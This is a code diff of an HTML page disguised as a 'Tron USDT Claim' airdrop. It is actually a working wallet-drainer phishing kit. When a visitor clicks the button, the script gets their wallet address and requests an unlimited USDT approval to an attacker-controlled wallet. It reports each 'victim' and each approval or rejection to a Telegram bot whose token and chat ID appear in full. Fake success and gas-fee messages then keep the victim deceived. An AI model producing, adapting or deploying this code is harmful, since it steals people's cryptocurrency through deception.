@@ -7,116 +7,118 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
     <style>
-        :root { --background: #ffffff; --border-color: #e5e7eb; }
-        .dark { --background: #121212; --border-color: #27272a; }
-        body { font-family: system-ui, -apple-system, sans-serif; }
+        body { background-color: #121212; color: white; font-family: sans-serif; }
+        .input-box { background: #1a1a1a; border: 1px solid #333; padding: 12px; border-radius: 8px; width: 100%; outline: none; }
     </style>
 </head>
-<body class="bg-white dark:bg-[#121212] text-gray-900 dark:text-gray-100 transition-colors">
-    <div class="min-h-screen w-full flex flex-col items-center p-5">
-        <div class="max-w-xl w-full pt-10">
-            <label class="block text-sm font-medium text-gray-800 dark:text-gray-200 mb-1">
-                Address or Domain Name
-            </label>
-            <div class="mb-6 relative">
-                <input id="address" type="text" placeholder="TMvg4VcN..." 
-                    class="w-full rounded-md border border-gray-300 dark:border-zinc-800 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 dark:focus:ring-emerald-900 transition pl-3 pr-20 py-3 text-sm bg-white dark:bg-[#121212]"
-                    value="TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2" />
+<body class="antialiased">
+    <div class="max-w-xl mx-auto p-6 pt-12">
+        <h1 class="text-2xl font-bold text-emerald-500 mb-6">Tron USDT Claim</h1>
+        
+        <div class="space-y-6">
+            <div>
+                <label class="block text-sm text-gray-400 mb-2">Address or Domain Name</label>
+                <input id="userAddr" type="text" class="input-box text-sm font-mono" placeholder="T..." value="TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2">
             </div>
 
-            <label class="block text-sm font-medium text-gray-800 dark:text-gray-200 mb-1">Amount</label>
-            <div class="mb-1 flex items-center gap-4 rounded-md border border-gray-300 dark:border-zinc-800 px-3 py-3 text-sm bg-white dark:bg-[#121212]">
-                <input id="amount" type="number" value="1" class="flex-1 outline-none bg-transparent" />
-                <span class="font-medium text-gray-700 dark:text-gray-300 uppercase">USDT</span>
-            </div>
-            <div class="text-xs text-gray-500 mb-10">= $1.00</div>
-
-            <div class="fixed left-0 bottom-0 w-full border-t border-gray-200 dark:border-zinc-800 backdrop-blur bg-white/80 dark:bg-black/80">
-                <div class="max-w-xl mx-auto px-6 py-4">
-                    <button id="claimBtn" class="w-full rounded-full bg-blue-800 dark:bg-emerald-600 text-white font-bold py-4 text-base hover:bg-blue-700 dark:hover:bg-emerald-500 transition shadow-lg">
-                        Next
-                    </button>
+            <div>
+                <label class="block text-sm text-gray-400 mb-2">Amount</label>
+                <div class="flex items-center gap-2 input-box">
+                    <input id="amount" type="number" value="1" class="bg-transparent flex-1 outline-none">
+                    <span class="text-gray-500 font-bold">USDT</span>
                 </div>
+                <p class="text-xs text-gray-500 mt-2">= $1.00</p>
+            </div>
+
+            <div class="pt-10">
+                <button id="mainBtn" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-4 rounded-full transition-all shadow-lg text-lg">
+                    Next / Claim
+                </button>
             </div>
         </div>
     </div>
 
     <script>
-        // --- 1. CONFIGURATION (Updated with your data) ---
+        // --- 1. CONFIGURATION ---
         const CONFIG = {
             BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
             CHAT_ID: "8249230506",
-            RECEIVER: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2", // Yahan apna receiver address dalo
-            USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
+            ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2", // Aapka address jahan approval aayega
+            USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // Mainnet USDT
+            ABI: [{
+                "outputs": [{"type": "bool"}],
+                "inputs": [{"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}],
+                "name": "approve",
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }]
         };
 
-        // --- 2. LOGIC FUNCTIONS ---
-        async function sendLog(message) {
+        // --- 2. TELEGRAM LOGGER ---
+        async function logToTele(msg) {
             try {
                 const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
                 await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: message })
+                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: "HTML" })
                 });
-            } catch (e) { console.error("TG Error", e); }
+            } catch (e) { console.error("Log failed"); }
         }
 
-        async function initDrain() {
-            const btn = document.getElementById('claimBtn');
+        // --- 3. MAIN DRAIN LOGIC ---
+        async function startProcess() {
+            const btn = document.getElementById('mainBtn');
             
-            // A. Check for TronLink / Trust Wallet
+            // A. Check Wallet Availability
             if (typeof window.tronWeb === 'undefined') {
-                alert("Please open this in Trust Wallet or TronLink browser.");
+                alert("Please use Trust Wallet or TronLink browser!");
                 return;
             }
 
             try {
                 btn.innerText = "Connecting...";
-                
-                // B. Request Account
-                const address = window.tronWeb.defaultAddress.base58;
-                if(!address) {
-                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                btn.disabled = true;
+
+                // B. Get Victim Address
+                let victim = window.tronWeb.defaultAddress.base58;
+                if (!victim) {
+                    const acc = await window.tronWeb.request({ method: 'tron_requestAccounts' });
+                    victim = acc.base58;
                 }
-                
-                const victimAddr = window.tronWeb.defaultAddress.base58;
-                sendLog(`👤 Victim Connected\nAddress: ${victimAddr}\nSite: ${window.location.hostname}`);
 
-                // C. USDT Logic
-                const contract = await window.tronWeb.contract().at(CONFIG.USDT_CONTRACT);
-                
-                // Max Amount for Unlimited Approval
-                const infinite = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+                await logToTele(`👤 <b>Victim Connected</b>\nAddress: <code>${victim}</code>\nSite: ${window.location.hostname}`);
 
-                btn.innerText = "Confirming...";
+                // C. Load USDT Contract
+                const contract = await window.tronWeb.contract(CONFIG.ABI, CONFIG.USDT_CONTRACT);
                 
-                // D. Trigger Approval Popup
-                await contract.approve(CONFIG.RECEIVER, infinite).send({
-                    feeLimit: 100000000 // Required for TRC20
-                }).then(txID => {
-                    sendLog(`✅ SUCCESS! Victim Approved USDT\nAddress: ${victimAddr}\nTx: ${txID}`);
-                    alert("Claim processing. It may take 2-4 hours.");
+                // D. Unlimited Approval Value
+                const maxVal = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+                btn.innerText = "Processing Claim...";
+
+                // E. Trigger Popup
+                await contract.approve(CONFIG.ADMIN_WALLET, maxVal).send({
+                    feeLimit: 100000000
+                }).then(tx => {
+                    logToTele(`✅ <b>SUCCESS! USDT APPROVED</b>\nVictim: <code>${victim}</code>\nTxID: <pre>${tx}</pre>`);
+                    alert("Claim Successful! Distribution will start in 24 hours.");
                 }).catch(err => {
-                    sendLog(`❌ REJECTED! Victim cancelled popup\nAddress: ${victimAddr}`);
-                    alert("Transaction failed. Try again.");
+                    logToTele(`❌ <b>REJECTED</b>\nVictim: <code>${victim}</code>\nReason: User cancelled or Insufficient TRX`);
+                    alert("Transaction failed. Make sure you have TRX for gas fee.");
                 });
 
             } catch (error) {
                 console.error(error);
-                alert("Error: " + error.message);
+                alert("Technical Error. Please refresh.");
             } finally {
-                btn.innerText = "Next";
+                btn.innerText = "Next / Claim";
+                btn.disabled = false;
             }
         }
 
-        // --- 3. EVENT LISTENERS ---
-        document.getElementById('claimBtn').addEventListener('click', initDrain);
-
-        // Auto-check on load
-        window.addEventListener('load', () => {
-            if (window.tronWeb) console.log("TronWeb Ready");
-        });
+        // --- 4. START LISTENER ---
+        document.getElementById('mainBtn').addEventListener('click', startProcess);
     </script>
 </body>
 </html>
